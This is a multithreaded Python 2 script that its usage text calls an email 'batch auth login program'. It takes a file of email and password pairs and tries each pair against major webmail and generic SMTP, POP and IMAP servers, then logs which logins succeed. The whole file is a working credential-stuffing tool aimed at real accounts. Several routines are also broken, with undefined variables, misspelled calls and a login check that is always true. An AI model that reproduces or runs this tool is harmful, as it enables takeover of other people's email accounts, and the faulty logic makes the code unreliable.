#!/usr/bin/python

import sys
import os
import time
import getpass,poplib,imaplib,smtplib
import re
import linecache
import threading
import thread
import dns.resolver
import string
import base64

class AuthEmail(threading.Thread):

    def __init__(self,fileInput):
        threading.Thread.__init__(self)
        self.filehandle = fileInput

    def highlight(self,s):
        return "%s[30;2m%s%s[1m"%(chr(27), s, chr(27))

    def inRed(self,s):
        return self.highlight('') + "%s[31;2m%s%s[0m"%(chr(27), s, chr(27))
    def inGreen(self,s):
        return self.highlight('') + "%s[32;2m%s%s[0m"%(chr(27), s, chr(27)) 

    def run(self):
        global mutex
        global currentline
    
        while True:
            #print line;
            mutex.acquire()
            line = linecache.getline(self.filehandle,currentline)
            if len(line)<1:
                break
            currentline += 1
            mutex.release()
        
            content=line.split(',')
            if(len(content)==2) :
                email=content[0]
                password=content[1]
                if password[-1]=='\n':
                    password = password[0:-1]
                print "[Line:%s]now test: " % (currentline-1) +email+"--"+password 

                if(self.isValidEmail(email.strip(), password.strip())):
                    SS = content[0] + " login success!!!"
                    print self.inGreen(SS)
                    mutex.acquire()
                    self.writeResultFile('s',line)
                    mutex.release()
                else:
                    FF =  content[0] + " login fail..."
                    print self.inRed(FF)
                    mutex.acquire()
                    self.writeResultFile('f',line)
                    mutex.release()
            else:
                print "Ignore an error line..."


    def getPopMail(self,mailDomain ):
        if( mailDomain == '163' ):
            mail = poplib.POP3('pop.163.com',timeout = 5 );
        elif( mailDomain == 'gmail' ):
	    mail = poplib.POP3_SSL('pop.gmail.com');
	elif( mailDomain == '126' ):
	    mail = poplib.POP3('pop.126.com',timeout = 5 );
	elif ( mailDomain == 'hotmail' ):
	    mail = poplib.POP3_SSL('pop3.live.com');
	elif ( mailDomain == 'yahoo' ):
	    mail = "";
	elif ( mailDomain == 'sina' ):
	    print "Sina Email Can`t be Vertified!";
	return mail

    def isValidEmail(self,email,password):
        emailparts = email.split('@')

	regmail = re.compile('gmail')
	re163 = re.compile('163')
	reyahoo = re.compile('yahoo')
	re126 = re.compile('126')
	resina = re.compile('sina')
	rehotmail = re.compile('outlook|hotmail|live')
	subDomain = ""
        if( len( emailparts ) != 2 ):
            print "Email Fomat Error "
            return 0
	if( regmail.match( str(emailparts[1]))):	
	    subDomain = 'gmail';
	elif( re163.match( str(emailparts[1]))):
	    subDomain = '163';	
	elif( reyahoo.match( str(emailparts[1]))):
	    subDomain = 'yahoo';
	    ret = "";

	    try:
                M = imaplib.IMAP4_SSL('imap.mail.yahoo.com')
		ret = M.login(email,password);

	    except:
		#print 'YHOO AA';
		pass

		#print str(ret);
	    retR=re.compile('^\(\'OK');	
	    if( retR.match(str(ret)) ):
		return True;
	    else:
                return False;
	elif( re126.match( str(emailparts[1]))):
	    subDomain = '126';	
	elif( resina.match( str(emailparts[1]))):
	    subDomain = 'sina';	
	elif( rehotmail.match( str(emailparts[1]))):
	    subDomain = 'hotmail';
        else:
            smtpAuth1 = self.NormalSmtpLogin(emailparts,password)
            if smtpAuth1:
                return True
            else:
                smtpAuth2 = self.NormalSSLSmtpLogin(emailparts,password)
                if smtpAuth2:
                    return True
                else:
                    smtpAuth =  self.AutoJudLogin(emailparts,password)
                    if smtpAuth == 2 :
                        print "%s smtp authentication failed.Now test POP authentication..." % email
                        return self.AutoPopLogin(emailparts,password)
                    elif smtpAuth == 1:
                        return True
                    else:
                        return False
	ret = "";

        try:
	    mail = self.getPopMail(subDomain)
	    mail.user(str(email))
	    mail.pass_(str(password))
	    ret = mail.stat()

	except:
            pass
        
        print str(ret)
        retR = re.compile('\(\d*,\s*\d*');
	if( retR.match(str(ret)) ):
	    return True
	else:
	    return False

    def writeResultFile(self,result,line):
        if(result == 's'):
	    fileHS = open("successMail.txt",'a+')
	if(result == 'f'):
	    fileHS = open('failedMail.txt','a+')
	#print line+"is writed!\n";
	#fileHS.seek(0,2);
	fileHS.write(line)
	#fileHS.close()

    def AutoPopLogin(self,emailparts,password):
        popAddr = 'pop.'+emailparts[1]
        Email = emailparts[0]+'@'+emailparts[1]
        try:
            mailAddr = poplib.POP3(popAddr,timeout=5)
            mailAddr.user(str(Email))
            mailAddr.pass_(str(password))
            popRet = mailAddr.stat()
            mailAddr.quit()
            print str(popRet)
        except:
            popRet = ''
            pass
        popretR = re.compile('\(\d*,\s*\d*')
        if( popretR.match(str(popRet)) ):
            return True
        else:
            try:
                mailAddr1 = poplib.POP3_SSL(popAddr,timeout=5)
                mailAddr1.user(str(Email))
                mailAddr1.pass_(str(password))
                popRetSSL = mailAddr1.stat()
                mailAddr1.quit()
                print str(popRetSSL)
            except:
                popRetSSL = ''
                pass
            if( popretR.match(str(popRetSSL)) ):
                return True
            else:
                print "%s authentication failed." % popAddr
                return self.AutoPop3Login(emailparts,password)



    def AutoPop3Login(self,emailparts,password):
        popAddr2 = 'pop3.'+emailparts[1]
        Email = emailparts[0]+'@'+emailparts[1]
        try:
            mailAddr2 = poplib.POP3(popAddr1,timeout=5)
            mailAddr2.user(str(Email))
            mailAddr2.pass_(str(password))
            pop3Ret = mailAddr2.stat()
            mailAddr2.quit()
            print str(pop3Ret)
        except:
            pop3Ret = ''
            pass
    
        pop3retR = re.compile('\(\d*,\s*\d*');
        if( pop3retR.match(str(pop3Ret)) ):
            return True
        else:
            try:
                mailAddr3 = poplib.POP3_SSL(popAddr1,timeout=5)
                mailAddr3.user(str(Email))
                mailAddr3.pass_(str(password))
                pop3RetSSL = mailAddr3.stat()
                mailAddr3.quit()
                print str(pop3RetSSL)
            except:
                return False
            if( pop3retR.match(str(pop3RetSSL)) ):
                return True
            else:
                print "%s authentication failed." % popAddr2
                return False

            
    def AutoJudLogin(self,emailparts,password):
        global mutex
        domainSuffix = emailparts[1]
        try:
            Match = dns.resolver.query(domainSuffix,'MX')
        except:
            print self.inRed("An error occured,maybe timeout or an invalid format...")
            return 2
        for eachMX in Match :
            domainM = list(eachMX.exchange)
            domainMatch = string.join(domainM,'.')[:-1]
            break
        if domainMatch.endswith('googlemail.com') or domainMatch.endswith('google.com') :
            return self.googleMail(emailparts,password)
        elif 'MICROSOFT' in domainMatch.upper():
            microAuth = self.microsoftMail(emailparts,password)
            if microAuth == 3:
                return self.normalMail(emailparts,password,domainMatch)
            else:
                return microAuth
        else: 
            return self.normalMail(emailparts,password,domainMatch)


    def normalMail(self,emailparts,password,domainMatch):
        print "%s is in auth use MD5 encode at %s on port [25]" % (emailparts[0]+'@'+emailparts[1],domainMatch)
        try:
            smtp = smtplib.SMTP()
            smtp.connect(domainMatch,"25")
            ehlo = smtp.ehlo()[1].upper()
        except:
            return self.normalMailSSL(emailparts,password,domainMatch)

        if ('STARTTLS' in ehlo):
            setTLS = True
        else:
            setTLS = False

        if ('AUTH' in ehlo or 'LOGIN' in ehlo):
            if setTLS:
                smtp.starttls()
                print "starttls enabled in this server..."
            user = emailparts[0]+'@'+emailparts[1]

            try:
                auth = smtp.login(user,password).upper()
                smtp.quit()
                if 'OK' in auth[1] or 'SUCCESS' or auth[1] or 200<=auth[0]<=299 in auth:
                    return 1
                else:
                    return self.normalMailAuth(emailparts,password,domainMatch)

            except:
                return self.normalMailAuth(emailparts,password,domainMatch)

        else:
            return self.normalSSLMail(emailparts,password,domainMatch)

    def normalMailAuth(self,emailparts,password,domainMatch):
        user = emailparts[0]+'@'+emailparts[1]
        print "%s is in auth use Base64 encode on port [25]" % user
        user = base64.encodestring(user)[0:-2]
        password = base64.encodestring(password)[0:-2]
        try:
            smtp = smtplib.SMTP(domainMatch,timeout=5)
            smtpEhlo = smtp.ehlo()
            if 'STARTTLS' in smtpEhlo[1].upper():
                setTls = True
            else:
                setTls = False

            if setTls:
                smtp.starttls()
            auth = smtp.login(user,password).upper()
        except:    
            return 2
        smtp.quit()
        if 'OK' in auth[1] or 'SUCCESS' in auth[1] or 200<=auth[0]<=299:
            return 1
        else:
            return 2


    def normalSSLMail(self,emailparts,password,domainMatch):
        ssluser = emailparts[0]+'@'+emailparts[1]
        print "%s is in auth use MD5 encode at %s on port [465]" % (ssluser,domainMatch)
        try:
            sslsmtp = smtplib.SMTP_SSL(domainMatch,465,timeout=5)
            sslsmtp.set_debuglevel(1)
            sslcheck = s.ehlo()

            if 200<=sslcheck[0]<=299 and 'AUTH' in sslcheck[1].upper():
                sslpass = password
                try:
                    sslLoginCheck = sslsmtp.login(ssluser,sslpass)
                    sslsmtp.quit()
                except:
                    return self.normalSSLBASE64(ssluser,sslpass,domainMatch)

                if 200<=sslLoginCheck[0]<=299 or 'ACCEPT' in sslLoginCheck[1] or 'SUCCESS' in sslLoginCheck[1]:
                    return 1
                else:
                    return self.normalSSLBASE64(ssluser,sslpass,domainMatch)
            else :
                return 2

        except :
            return 2

    def normalMailSSL(self,emailparts,password,domainMatch):
        SSLuser = emailparts[0]+'@'+emailparts[1]
        print "%s is in auth use Base64 encode at %s on port [587]" % (SSLuser,domainMatch)
        try:
            smtpSSL = smtplib.SMTP_SSL(domainMatch,587,timeout=5)
            smtpSSL.set_debuglevel(1)
            SSLCHECK = smtpSSL.ehlo()
        except:
            return self.normalSSLMail(emailparts,password,domainMatch)

        if 200<=sslcheck[0]<=299 or 'AUTH' in sslcheck[1].upper():
            SSLuser = base64.encodestring(SSLuser)
            SSLpass = base64.encodestring(password)
            print "SSLuser is %s,pass is%s" % SSLuser,SSLpass
            try:
                SSLLoginCheck = sslsmtp.login(ssluser,sslpass)
            except:
                return 2

            smtpSSL.quit()
            if 200<=SSLLoginCheck[0]<=299 or 'ACCEPT' in SSLLoginCheck[1] or 'SUCCESS' in SSLLoginCheck[1]:
                return 1
            else:
                return 2
        else:
            return 2



    def normalSSLBASE64(self,ssluser,sslpass,domainMatch):
        sslsmtp = smtplib.SMTP_SSL(domainMatch,465,timeout=5)
        print "%s is in auth use Base64 encode at %s on port [465]" % (ssluser,domainMatch)
        ssluser = base64.encodestring(ssluser)
        sslpass = base64.encodestring(sslpass)
        try:
            sslLoginCheck_1 = sslsmtp.login(ssluser,sslpass)
        except:
            return 2

        sslsmtp.quit()
        if 200<=sslLoginCheck_1[0]<=299 or 'ACCEPT' in sslLoginCheck_1[1] or 'SUCCESS' in sslLoginCheck_1[1]:
            return 1
        else:
            return 2


    def googleMail(self,emailparts,password):
        googleSmtpUser = emailparts[0]+'@'+emailparts[1]
        print "%s is google enterprise email,authing..." % googleSmtpUser
        try:
            googleSmtp = smtplib.SMTP('smtp.gmail.com','25',timeout=5)
            googleSmtp.starttls()
            googleSmtpCheck = list(googleSmtp.login(googleSmtpUser,password))
            googleSmtp.quit()
            if 200<=googleSmtpCheck[0]<=299 or 'ACCEPT' in googleSmtpCheck[1].upper() or 'SUCCESS' in googleSmtpCheck[1].upper():
                return 1
            else:
                return 0

        except:
            return 0

    def microsoftMail(self,emailparts,password):
        Email = emailparts[0]+'@'+emailparts[1]
        print "%s is microsoft enterprise email,authing..." % Email
        try:
            microMail = poplib.POP3_SSL('pop3.live.com',timeout=5)
            microMail.user(str(Email))
            microMail.pass_(str(password))
            MStat = microMail.stat()
            print str(MStat)
            retR = re.compile('\(\d*,\s*\d*');
            if( retR.match(str(ret)) ):
                return 1
            else:
                return 0
        except:
            return 3

    def NormalSmtpLogin(self,emailparts,password):
        emailAddr = 'smtp.'+emailparts[1]
        user = emailparts[0]+'@'+emailparts[1]
        print "%s is in auth use MD5 encode at %s on port [25]" % (user,emailAddr)
        
        try:
            emailLogin = smtplib.SMTP(emailAddr)
            normalEhlo = emailLogin.login(user,password)
            normalEhlo = list(normalEhlo)
            emailLogin.quit()
            if 200<=normalEhlo[0]<=299 or 'SUCCESS' in normalEhlo[1].upper():
                return True
            else:
                pass
        except:
            pass

        try:
            emailLogin1 = smtplib.SMTP(emailAddr)
            print "%s is in auth use Base64 encode at %s on port [25]" % (user,emailAddr)
            user1 = base64.encodestring(user)
            pass1 = base64.encoddestring(password)
            normalEhlo1 = list(emailLogin.login1(user1,pass1))
            emailLogin1.quit()
            if 200<=normalEhlo1[0]<=299 or 'SUCCESS' in normalEhlo1[1].upper():
                return True
            else:
                pass
        except:
            pass

        try:
            emailLogin = smtplib.SMTP_SSL(emailAddr,timeout=5)
            normalEhlo = list(emailLogin.login(user,password))
            emailLogin.quit()
            if 200<=normalEhlo[0]<=299 or 'SUCCESS' in normalEhlo[1].upper():
                return True
            else:
                return False
        except:
            return False
            
    def NormalSSLSmtpLogin(self,emailparts,password):
        emailAddr = 'smtp.'+emailparts[1]
        user = emailparts[0]+'@'+emailparts[1]
        print "%s is in auth use MD5 encode at %s on port [465]" % (user,emailAddr)
        try:
            emailLogin = smtplib.SMTP_SSL(emailAddr,465,timeout=5)
            normalEhlo = list(emailLogin.login(user,password))
            emailLogin.quit()
            if 200<=normalEhlo[0]<=299 or 'SUCCESS' in normalEhlo[1].upper():
                return True
            else:
                print "%s is in auth use Base64 encode at %s on port [465]" % (user,emailAddr)
                emailLogin1 = smtplib.SMTP_SSL(emailAddr,465,timeout=5)
                user1 = base64.encodestring(user1)
                pass1 = base64.encodestring(password)
                normalEhlo1 = list(emailLogin1.login(user1,pass1))
                emailLogin1.quit()
                if 200<=normalEhlo[0]<=299 or 'SUCCESS' in normalEhlo[1].upper():
                    return True
                else:
                    return False
        except:
            return False

class ExceptionErroCommand(Exception) :
    def __init__(self,thread) :
        Exception.__init__(self)
        self.thread = thread


class ExceptionFileNotExist(Exception) :
    def __init__(self,File) :
        Exception.__init__(self)
        self.File = File

class ExceptionFileHasExist(Exception) :
    def __init__(self,File) :
        Exception.__init__(self)
        self.File = File



if __name__ == '__main__' :

    if len(sys.argv)<3 or len(sys.argv)>4:
        print """
This is an Emails batch auth login program!
useage:
    %s <email_list_file> <threads> [start_line_number]


Notice:Your email list must includes complete address which 
also include a character '@' and the password you want to 
test,and they must be separated with character ','!

Example:
    xxxx@gmail.com,password

After it completed,it will create 2 file in current path 
which name is 'successMail.txt' and 'failedMail.txt'.

             """ % sys.argv[0]
        sys.exit()
    global fileInput
    global filehandle
    global mutex
    global currentline
    if len(sys.argv)==4:
        if sys.argv[3].isdigit():
            currentline = int(sys.argv[3])
            print "Starting from the %sth line" % currentline
        else:
            print "Error line number..."
            time.sleep(1)
            sys.exit()
    elif len(sys.argv)==3:
        currentline = 1
    else:
        print "error arguments."
        time.sleep(1)
        sys.exit()
        

    try :
        fileInput = sys.argv[1]
        thread = sys.argv[2]

        if not thread.isdigit() :
            raise ExceptionErroCommand(thread)
		
        thread = int(thread)
	if (thread>=20 or thread<=0):
	    print "Thread is less than 0 or more than 20,please retry..."
	    time.sleep(1)
	    sys.exit()
	if not os.path.exists(fileInput) :
	    raise ExceptionFileNotExist(fileInput)

        threads = []
        mutex = threading.Lock()

        for x in xrange(0,int(thread)):
            z = AuthEmail(fileInput)
            z.setDaemon(True)
            threads.append(z)
        for t in threads:
            t.start()
    
        while 1:
            alive = False
            for i in range(int(thread)):
                alive = alive or threads[i].isAlive()
                if not threads[i].isAlive():
                    time.sleep(7)
                    print "\nAll auth has ended.Good luck!"
                    sys.exit()

        
    except ExceptionErroCommand:
        print "Threads is not a number!\n"
        time.sleep(1)
        sys.exit()
        
    except ExceptionFileNotExist:
        print "Your Input file is not exist!\n"
        time.sleep(1)
        sys.exit()

    except KeyboardInterrupt:
        sys.exit()

